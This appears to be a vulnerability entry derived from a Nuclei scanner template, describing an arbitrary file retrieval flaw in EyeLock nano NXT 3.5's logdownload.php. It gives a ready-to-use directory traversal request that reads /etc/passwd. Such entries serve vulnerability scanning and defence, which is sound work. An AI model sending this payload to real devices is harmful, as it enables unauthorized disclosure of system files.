# Vulnerability: EyeLock nano NXT 3.5 - Arbitrary File Retrieval
**Classification:** IOT
**Source:** Nuclei Template (`eyelock-nano-lfd.yaml`)

## Description
EyeLock nano NXT suffers from a file retrieval vulnerability when input passed through the 'path' parameter to 'logdownload.php' script is not properly verified before being used to read files. This can be exploited to disclose contents of files from local resources.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/scripts/logdownload.php?dlfilename=juicyinfo.txt&path=../../../../../../../../etc/passwd
```

